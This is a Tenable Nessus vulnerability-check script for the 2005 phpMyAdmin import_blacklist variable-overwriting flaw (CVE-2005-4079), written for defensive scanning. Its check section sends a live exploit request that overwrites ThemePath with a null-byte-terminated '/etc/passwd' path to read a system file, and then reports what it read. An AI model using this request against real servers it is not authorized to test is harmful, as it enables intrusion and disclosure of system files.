#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22124);
  script_version("$Revision: 1.19 $");
  script_cvs_date("$Date: 2016/11/02 14:37:08 $");

  script_cve_id("CVE-2005-4079");
  script_bugtraq_id(15761);
  script_osvdb_id(21508);

  script_name(english:"phpMyAdmin import_blacklist Variable Overwriting");
  script_summary(english:"Tries to read a local file using phpMyAdmin");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
multiple issues." );
  script_set_attribute(attribute:"description", value:
"The version of phpMyAdmin installed on the remote host fails to
properly protect the global 'import_blacklist' variable, which is used
in the 'libraries/grab_globals.lib.php' script to protect global
variables in its register_globals emulation layer.  An unauthenticated
attacker can exploit this flaw to overwrite arbitrary variables,
thereby opening the application up to remote / local file include as
well as cross-site scripting attacks." );
  script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_252005.110.html" );
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2005/Dec/272" );
  script_set_attribute(attribute:"see_also", value:"http://www.phpmyadmin.net/home_page/security.php?issue=PMASA-2005-9" );
  script_set_attribute(attribute:"solution", value:
"Upgrade to phpMyAdmin version 2.7.0-pl1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:P/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"No known exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"false");
  script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/31");
  script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/07");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");
  script_copyright(english:"This script is Copyright (C) 2006-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, php:TRUE);


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the affected script exists.
  url = string(dir, "/css/phpmyadmin.css.php");
  r = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
  res = r[2];

  # If it does...
  if ("li#li_pma_homepage" >< res)
  {
    # Try to exploit the flaw to read a file.
    file = "/etc/passwd%00";
    postdata = string(
      "usesubform[1]=&",
      "subform[1][GLOBALS][cfg][ThemePath]=", file
    );
    r = http_send_recv3(method: "POST", port: port,
      item: string(url, "?import_blacklist[0]=/", SCRIPT_NAME, "/"),
      content_type: "application/x-www-form-urlencoded",
      exit_on_fail:TRUE,
      data: postdata);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      {
        contents = strstr(res, "img.lightbulb");
        if (contents) contents = strstr(contents, "}");
        if (contents) contents = contents - "}";
      }

      if (contents)
        report = string(
          "Here are the contents of the file '/etc/passwd' that Nessus\n",
          "was able to read from the remote host :\n",
          "\n",
          contents
        );
      else report = NULL;

      security_warning(port:port, extra:report);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      exit(0);
    }
  }
}
